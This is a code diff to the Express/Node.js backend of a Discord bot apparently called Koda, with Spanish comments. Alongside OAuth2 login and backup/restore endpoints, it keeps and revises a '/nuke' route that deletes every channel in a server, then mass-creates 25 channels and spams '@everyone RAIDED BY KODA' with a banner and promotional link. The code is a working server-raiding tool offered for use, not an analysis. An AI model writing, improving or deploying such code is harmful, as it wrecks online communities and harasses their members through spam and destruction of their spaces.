@@ -7,19 +7,26 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+const client = new Client({ 
+    intents: [
+        GatewayIntentBits.Guilds, 
+        GatewayIntentBits.GuildMessages, 
+        GatewayIntentBits.MessageContent 
+    ] 
+});
 
 const CLIENT_ID = '1469577414022795346'; 
 const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
 const REDIRECT_URI = 'https://koda-raid.onrender.com/auth/callback';
 
-// Login
+let backups = {}; // Base de datos temporal para backups
+
+// OAuth2 Login
 app.get('/login', (req, res) => {
     const url = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds`;
     res.redirect(url);
 });
 
-// Callback
 app.get('/auth/callback', async (req, res) => {
     const { code } = req.query;
     try {
@@ -30,11 +37,8 @@ app.get('/auth/callback', async (req, res) => {
             code: code,
             redirect_uri: REDIRECT_URI,
         }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
-
         res.redirect(`https://koda-raid.vercel.app/?token=${response.data.access_token}`);
-    } catch (err) {
-        res.status(500).send("Login Error");
-    }
+    } catch (err) { res.status(500).send("Login Error"); }
 });
 
 // API Servers
@@ -47,39 +51,68 @@ app.get('/api/servers', async (req, res) => {
         const botGuildIds = client.guilds.cache.map(g => g.id);
         const mutual = userGuilds.data.filter(g => (parseInt(g.permissions) & 0x8) === 0x8 && botGuildIds.includes(g.id));
         res.json(mutual);
-    } catch (e) { res.status(500).send("Error fetching servers"); }
+    } catch (e) { res.status(500).send("Error"); }
 });
 
-// NUKE + BANNER + MENSAJE EN INGLÉS
-app.get('/nuke', async (req, res) => {
-    const { guildId, name } = req.query;
+// PREMIUM: Crear Backup
+app.get('/backup', async (req, res) => {
+    const { guildId } = req.query;
     const guild = client.guilds.cache.get(guildId);
-    if (!guild) return res.status(404).send("Bot not found in server");
-
-    const channelName = name || 'koda-raid'; 
+    if (!guild) return res.status(404).send("Bot not in server");
 
     try {
         const channels = await guild.channels.fetch();
-        // 1. Borrar Canales
+        backups[guildId] = channels.map(c => ({
+            name: c.name,
+            type: c.type,
+            parent: c.parentId ? channels.get(c.parentId).name : null
+        }));
+        res.send("Backup Success");
+    } catch (e) { res.status(500).send("Backup Fail"); }
+});
+
+// PREMIUM: Restaurar Backup
+app.get('/restore', async (req, res) => {
+    const { guildId } = req.query;
+    const backup = backups[guildId];
+    const guild = client.guilds.cache.get(guildId);
+    if (!backup || !guild) return res.status(404).send("No data");
+
+    try {
+        const current = await guild.channels.fetch();
+        for (const c of current.values()) await c.delete().catch(() => {});
+
+        for (const item of backup) {
+            await guild.channels.create({ name: item.name, type: item.type }).catch(() => {});
+        }
+        res.send("Restored");
+    } catch (e) { res.status(500).send("Restore Fail"); }
+});
+
+// NUKE COMMAND
+app.get('/nuke', async (req, res) => {
+    const { guildId, name } = req.query;
+    const guild = client.guilds.cache.get(guildId);
+    if (!guild) return res.status(404).send("Bot not found");
+
+    try {
+        const channels = await guild.channels.fetch();
         for (const c of channels.values()) await c.delete().catch(() => {});
         
-        // 2. Crear Canales + Enviar Banner
-        for (let i = 0; i < 30; i++) {
+        for (let i = 0; i < 25; i++) {
             setTimeout(() => {
-                guild.channels.create({ name: channelName, type: 0 })
-                    .then(async channel => {
-                        // AQUÍ SE ENVÍA EL BANNER Y EL TEXTO EN INGLÉS
-                        await channel.send({
-                            content: "@everyone **SYSTEM PURGED BY KODA** ☠️\nJoin the revolution: https://koda-raid.vercel.app",
-                            files: ["https://koda-raid.vercel.app/banner.png"] // Asegúrate que banner.png esté en tu GitHub
+                guild.channels.create({ name: name || 'koda-raid', type: 0 })
+                    .then(ch => {
+                        ch.send({
+                            content: "@everyone **RAIDED BY KODA** ☠️\nhttps://koda-raid.vercel.app",
+                            files: ["https://koda-raid.vercel.app/banner.png"]
                         }).catch(() => {});
-                    })
-                    .catch(() => {});
-            }, i * 350);
+                    }).catch(() => {});
+            }, i * 400);
         }
-        res.send("Raid initiated");
-    } catch (e) { res.status(500).send("Failed"); }
+        res.send("Nuked");
+    } catch (e) { res.status(500).send("Fail"); }
 });
 
 client.login(process.env.DISCORD_TOKEN);
-app.listen(process.env.PORT || 3000);
+app.listen(process.env.PORT || 3000, () => console.log('Koda 2.0 Online'));
